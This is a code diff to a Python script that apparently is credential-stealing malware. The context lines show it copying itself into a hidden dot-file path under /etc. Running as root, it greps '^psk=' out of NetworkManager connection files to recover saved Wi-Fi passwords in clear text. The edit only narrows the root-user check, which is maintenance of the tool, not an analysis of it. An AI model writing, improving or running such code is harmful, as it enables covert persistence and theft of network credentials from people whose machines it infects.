@@ -22,7 +22,7 @@ import base64
 import signal
 import re
 
-if 'root' in getpass.getuser() :
+if 'root' in getpass.getuser() and len(getpass.getuser())==4 :
         try :
             if os.path.exists('/etc'+'/.Cpython3/'+'.'+os.path.basename(__file__).strip()):
                 pass
@@ -95,7 +95,7 @@ try:
                name = '/etc/NetworkManager/system-connections/'+'{}'.format(line)
                name=str(name)
                name_1=name.replace('\n','')
-               if 'root'in username:
+               if 'root'in username and len(username)==4:
                   rootuser= "grep -hr '^psk=' /etc/NetworkManager/system-connections/"+'{}'.format(line)
                   passwordwifi = subprocess.check_output(rootuser,shell=True)
                   passwordclear = passwordwifi.replace('psk=','') 
@@ -114,7 +114,7 @@ try:
                   
         with open ('.read1','r',)as file_1:
               file_2 =file_1.readlines()
-        if 'root'  in username:
+        if 'root'  in username and len(username)==4:
               with open('.read3','r')as file00:
                    file01=file00.readlines()        
               try:               
